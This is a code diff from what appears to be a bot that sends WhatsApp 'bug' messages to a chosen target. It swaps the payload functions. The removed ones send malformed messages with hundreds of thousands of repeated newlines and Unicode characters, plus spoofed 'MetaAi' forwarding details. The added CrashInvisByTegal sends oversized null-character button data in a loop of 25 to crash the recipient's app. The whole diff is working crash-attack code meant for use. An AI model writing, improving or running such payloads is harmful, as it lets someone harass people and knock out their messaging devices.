@@ -2452,9 +2452,9 @@ bot.command("LockChat", checkChannel, checkCooldown, checkWhatsAppConnection, as
     },
   });
 
-  for (let i = 0; i < 15; i++) {
-    await TegalDelaySpam(sock, target);
-    await sleep(800);
+  for (let i = 0; i < 25; i++) {
+    await CrashInvisByTegal(sock, target);
+    await sleep(1000);
     console.log(`Succes Sending Bugs To : ${target}`);
   }
 });
@@ -2851,72 +2851,30 @@ async function FaiqFreeze(sock, target) {
   }
 }
 
-async function TegalDelaySpam(sock, target) {
-  const vnxdly = {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          body: {
-            text: "Tegal The Real Gcr"
-          },
-          footer: { 
-            text: "By @gaxx4u"
-          },
-          nativeFlowMessage: {
-            buttons: "\n".repeat(250000)
-          }
-        }
-      }
-    }
-  }; 
-
-  await sock.relayMessage(
-    target,
-    {
-      protocolMessage: {
-        type: 11
-      },
-      contextInfo: {
-        forwardingScore: 9741,
-        isForwarded: true,
-        forwardedAIBotMessageInfo: {
-          botName: "MetaAi",
-          botJid: ["13135550202@s.whatsapp.net"],
-          creatorName: "@gaxx4u"
-        }
-      }
-    }, 
-    {
-      participant: { jid: target }
-    }
-  );
-
-  await sock.relayMessage(target, vnxdly, { 
-    participant: { jid: target } 
-  });
-}
-
-async function blankTegal(sock, target) {
-    const msg = {
-        viewOnceMessage: {
-            message: {
-                newsletterAdminInviteMessage: {
-                    newsletterJid: "083149016304@newsletter",
-                    inviteCode: "𑜦𑜠".repeat(120000),
-                    inviteExpiration: 99999999999,
-                    newsletterName: "ោ៝" + "ꦾ".repeat(250000),
-                    body: {
-                        text: "TegalCty" + "ી".repeat(250000)
-                    }
-                }
-            }
-        }
-    };
-
-    await sock.relayMessage(target, msg, {
-        participant: { jid: target },
-        messageId: sock.generateMessageTag()
-    });
+async function CrashInvisByTegal(sock, target) {
+    try {
+        const rezz = {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        body: {
+                            text: "\u00A1"+"\u0000"
+                        },
+                        nativeFlowMessage: {
+                            messageParamsJson: "[".repeat(10000),
+                            buttons: "\u00A1".repeat(250000) + "\u0000".repeat(250000)
+                        }
+                    }
+                }
+            }
+        };
+        
+        await sock.relayMessage(target, rezz, { participant: { jid: target } });
+        
+        return { status: true, message: "Crash invisible successfully" };
+    } catch (error) {
+        return { status: false, error: error.message };
+    }
 }
 
 async function TegalCtyDelay(sock, target) {
